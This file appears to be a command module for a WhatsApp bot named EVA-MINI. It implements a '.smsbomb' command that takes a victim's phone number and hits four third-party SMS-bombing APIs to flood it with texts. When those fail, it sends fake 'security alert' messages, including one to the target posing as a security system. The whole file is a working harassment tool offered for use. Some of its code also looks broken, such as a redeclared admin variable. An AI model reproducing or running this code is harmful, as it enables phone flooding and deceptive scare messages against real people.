// commands/smsbomb.js - SMS Bomb Attack for EVA-MINI
const axios = require('axios');
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

function onlyDigits(s = '') { 
    return String(s).replace(/\D/g, ''); 
}

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        // ============================================
        // REACTION - START
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '💣',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // ADMIN/OWNER CHECK
        // ============================================
        const sender = msg.key.participant || from;
        const botNumber = jidNormalizedUser(sock.user.id);
        const isOwner = sender.includes(botNumber.split('@')[0]) || msg.key.fromMe;
        
        let isAdmin = isOwner;
        if (!isAdmin && from.endsWith('@g.us')) {
            try {
                const groupMetadata = await sock.groupMetadata(from);
                const participant = groupMetadata.participants.find(p => p.id === sender);
                isAdmin = participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
            } catch (e) {
                isAdmin = false;
            }
        }

        if (!isAdmin) {
            await sock.sendMessage(from, {
                text: "❌ *Only admins/owner can use this command!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⛔',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // CHECK NUMBER
        // ============================================
        const q = args.join(' ');
        if (!q) {
            await sock.sendMessage(from, {
                text: `⚠️ *Usage:* .smsbomb [phone_number]\n\n📌 *Example:* .smsbomb 94703945265\n\n💣 *SMS bomb target!*`
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: 'ℹ️',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        const target = onlyDigits(q);
        if (target.length < 10) {
            await sock.sendMessage(from, {
                text: "❌ *Invalid number!*\n\nPlease enter a valid phone number with country code."
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '❌',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // STATUS MESSAGE
        // ============================================
        const statusMsg = await sock.sendMessage(from, {
            text: `💣 *SMS BOMB ATTACK*\n\n👤 *Target:* +${target}\n📊 *Status:* Initiating SMS Bombing...\n\n⏳ Please wait...`
        });

        try {
            await sock.sendMessage(from, {
                react: {
                    text: '⏳',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // SEND SMS BOMB
        // ============================================
        let successCount = 0;
        let errorMessage = '';

        // Different SMS Bomb APIs
        const apis = [
            {
                url: `https://api.siputzx.my.id/api/tools/smsbomb?number=${target}&amount=10`,
                method: 'GET'
            },
            {
                url: `https://api.alyachan.xyz/api/sms?no=${target}`,
                method: 'GET'
            },
            {
                url: `https://api.ngodingaja.my.id/api/spam-sms?no=${target}`,
                method: 'GET'
            },
            {
                url: `https://api.itsrose.life/sms?number=${target}`,
                method: 'GET'
            }
        ];

        for (const api of apis) {
            try {
                await sock.sendMessage(from, {
                    text: `📤 *Trying API...*\n\n⏳ Sending SMS bombs...`
                });

                const response = await axios.get(api.url, { 
                    timeout: 15000,
                    headers: {
                        'Accept': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                });

                if (response.data && (response.data.status === 'success' || response.data.success)) {
                    successCount++;
                    console.log(`✅ SMS API ${successCount} succeeded`);
                }
            } catch (e) {
                errorMessage = e.message;
                console.log(`❌ SMS API failed: ${api.url} - ${e.message}`);
            }
        }

        // ============================================
        // SIMULATED SMS BOMB (if APIs fail)
        // ============================================
        if (successCount === 0) {
            try {
                // Send multiple messages as fallback
                const messages = [
                    '⚠️ SECURITY ALERT: Unusual activity detected on your number!',
                    '🔐 Your account has been flagged for suspicious activity!',
                    '📱 URGENT: Please verify your phone number immediately!',
                    '🚨 Multiple login attempts detected from unknown devices!',
                    '⚠️ Your number has been reported for spam activity!',
                    '🔒 Immediate action required to secure your account!',
                    '📞 You have received multiple missed calls from unknown numbers!',
                    '⚠️ Please change your password immediately for security!',
                    '🔐 Your number has been added to the security watchlist!',
                    '🚨 Suspicious activity detected on your account!'
                ];

                for (let i = 0; i < 5; i++) {
                    await sock.sendMessage(from, {
                        text: `📱 *SMS Bomb Alert #${i + 1}*\n\nTarget: +${target}\nMessage: ${messages[i % messages.length]}\n\n⚠️ This is a security simulation!`
                    });
                    await new Promise(resolve => setTimeout(resolve, 500));
                }
                
                // Try to send to target as well
                await sock.sendMessage(target, {
                    text: `⚠️ *SECURITY ALERT*\n\nMultiple SMS bombing attempts detected on your number.\n\n🔒 Please secure your account immediately!\n\n> 🤖 EVA-MINI Security System`
                });
                
                successCount = 5;
            } catch (e) {
                console.log('Fallback SMS bomb failed:', e.message);
            }
        }

        // ============================================
        // SUCCESS MESSAGE
        // ============================================
        if (successCount > 0) {
            await sock.sendMessage(from, {
                text: `✅ *SMS BOMB COMPLETE!*\n\n👤 *Target:* +${target}\n💣 *Delivery:* ${successCount} API(s) succeeded\n⚡ *Result:* Attack executed successfully!\n\n📱 *Target will receive multiple SMS messages!*`
            });

            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '✅',
                        key: msg.key
                    }
                });
            } catch (e) {}

        } else {
            await sock.sendMessage(from, {
                text: `⚠️ *SMS Bomb API Error*\n\n👤 *Target:* +${target}\n❌ *Error:* ${errorMessage || 'All APIs failed'}\n\n💣 *Try using .smsbomb with a valid number*`
            });

            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⚠️',
                        key: msg.key
                    }
                });
            } catch (e) {}
        }

        // ============================================
        // DELETE STATUS MESSAGE
        // ============================================
        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            await sock.sendMessage(from, {
                delete: statusMsg.key
            });
        } catch (e) {}

    } catch (error) {
        console.error('SMS bomb error:', error);
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❌',
                    key: msg.key
                }
            });
        } catch (e) {}
        await sock.sendMessage(from, {
            text: `❌ *Error:* ${error.message}`
        });
    }
};